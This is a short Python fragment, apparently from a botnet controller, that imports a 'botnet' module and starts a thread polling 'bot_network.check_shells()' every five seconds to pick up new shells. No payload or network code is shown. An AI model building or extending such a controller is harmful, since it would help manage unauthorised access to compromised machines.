from botnet import *
from threading import Thread
from time import sleep


def new_shells():
	while 1:
		bot_network.check_shells()
		sleep(5)


def main():
	t = Thread(target=new_shells, args=())
	t.start()